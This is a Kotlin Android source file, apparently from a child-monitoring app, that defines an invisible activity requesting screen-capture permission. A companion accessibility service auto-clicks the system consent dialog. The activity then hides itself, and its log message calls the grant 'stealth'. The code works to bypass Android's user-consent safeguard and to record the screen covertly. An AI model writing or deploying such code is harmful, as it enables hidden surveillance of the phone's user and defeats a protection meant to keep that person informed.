package com.example.childapp.screen

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import com.example.childapp.accessibility.ChildAccessibilityService

/**
 * Invisible, headless activity that requests Android's MediaProjection permission
 * when screen capture is triggered while the app is in the background or on Android 14+.
 *
 * ChildAccessibilityService automatically intercepts and auto-clicks "Entire screen"
 * and "Start now", allowing this activity to immediately obtain the capture token,
 * start ScreenCaptureService, and safely wait until the foreground service binds
 * the VirtualDisplay before finishing.
 */
class InvisibleScreenCaptureActivity : ComponentActivity() {

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val token = intent.getStringExtra(EXTRA_TOKEN)
        val sessionId = intent.getStringExtra(EXTRA_SESSION_ID)

        if (result.resultCode == Activity.RESULT_OK && result.data != null && token != null && sessionId != null) {
            Log.i(TAG, "MediaProjection granted successfully in stealth for session $sessionId")
            ScreenCaptureService.pendingProjectionIntent = result.data
            ScreenCaptureService.start(this, result.resultCode, result.data!!, token, sessionId)

            // Move to back immediately so no transparent frame stays in the foreground
            moveTaskToBack(true)

            // Android 14 strict enforcement: keep this Activity alive until ScreenCaptureService binds capture
            onCaptureInitialized = {
                Log.d(TAG, "Capture initialized, finishing InvisibleScreenCaptureActivity gracefully")
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isFinishing && !isDestroyed) {
                        finish()
                        overridePendingTransition(0, 0)
                    }
                }, 1000)
            }

            // Safety timeout to guarantee cleanup
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    finish()
                    overridePendingTransition(0, 0)
                }
            }, 7000)
        } else {
            Log.w(TAG, "MediaProjection was cancelled or failed with resultCode ${result.resultCode}")
            finish()
            overridePendingTransition(0, 0)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            ChildAccessibilityService.instance?.pollForMediaProjectionDialog()
            mediaProjectionLauncher.launch(mgr.createScreenCaptureIntent())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to launch screen capture intent", e)
            finish()
        }
    }

    override fun finish() {
        super.finish()
        overridePendingTransition(0, 0)
    }

    override fun onDestroy() {
        isLaunching = false
        onCaptureInitialized = null
        super.onDestroy()
    }

    companion object {
        private const val TAG = "InvisibleCaptureAct"
        const val EXTRA_TOKEN = "extra_token"
        const val EXTRA_SESSION_ID = "extra_session_id"
        var isLaunching = false
        var onCaptureInitialized: (() -> Unit)? = null

        fun launch(context: Context, token: String, sessionId: String) {
            if (isLaunching) {
                Log.d(TAG, "InvisibleScreenCaptureActivity is already launching, skip duplicate")
                return
            }
            isLaunching = true
            val intent = Intent(context, InvisibleScreenCaptureActivity::class.java).apply {
                putExtra(EXTRA_TOKEN, token)
                putExtra(EXTRA_SESSION_ID, sessionId)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION
            }
            context.startActivity(intent)
        }
    }
}
